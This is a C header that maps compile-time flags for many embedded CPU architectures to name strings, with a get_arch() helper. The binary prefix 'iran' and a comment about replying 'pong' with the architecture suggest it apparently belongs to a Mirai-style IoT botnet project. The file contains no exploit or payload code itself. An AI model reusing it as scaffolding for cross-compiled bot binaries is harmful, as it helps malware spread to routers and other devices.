#pragma once

#ifndef UTILS_H
#define UTILS_H

//so if test then test.x86_64 or test.armv7l etc
#define BINARY_PREFIX "iran"

#if defined(ARCH_arc)
#define ARCH_STR arc
#elif defined(ARCH_powerpc)
#define ARCH_STR powerpc
#elif defined(ARCH_sh4)
#define ARCH_STR sh4
#elif defined(ARCH_mips)
#define ARCH_STR mips
#elif defined(ARCH_mipsel)
#define ARCH_STR mipsel
#elif defined(ARCH_x86_64)
#define ARCH_STR x86_64
#elif defined(ARCH_m68k)
#define ARCH_STR m68k
#elif defined(ARCH_sparc)
#define ARCH_STR sparc
#elif defined(ARCH_i486)
#define ARCH_STR i486
#elif defined(ARCH_aarch64)
#define ARCH_STR aarch64
#elif defined(ARCH_armv4l)
#define ARCH_STR armv4l
#elif defined(ARCH_armv5l)
#define ARCH_STR armv5l
#elif defined(ARCH_armv6l)
#define ARCH_STR armv6l
#elif defined(ARCH_armv7l)
#define ARCH_STR armv7l
#elif defined(ARCH_mipsrouter)
#define ARCH_STR mipsrouter
#else
#define ARCH_STR unknown
#endif

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

// function from get_arch() to get the architecture name
// used in main.c to pong with arch
// i may find another use for it in future
static inline const char* get_arch() {
#ifdef ARCH_arc
    return "arc";
#elif defined(ARCH_powerpc)
    return "powerpc";
#elif defined(ARCH_sh4)
    return "sh4";
#elif defined(ARCH_mips)
    return "mips";
#elif defined(ARCH_mipsel)
    return "mipsel";
#elif defined(ARCH_x86_64)
    return "x86_64";
#elif defined(ARCH_m68k)
    return "m68k";
#elif defined(ARCH_sparc)
    return "sparc";
#elif defined(ARCH_i486)
    return "i486";
#elif defined(ARCH_aarch64)
    return "aarch64";
#elif defined(ARCH_armv4l)
    return "armv4l";
#elif defined(ARCH_armv5l)
    return "armv5l";
#elif defined(ARCH_armv6l)
    return "armv6l";
#elif defined(ARCH_armv7l)
    return "armv7l";
#elif defined(ARCH_mipsrouter)
    return "mips";
#else
    return "unknown";
#endif
}

#endif // UTILS_H
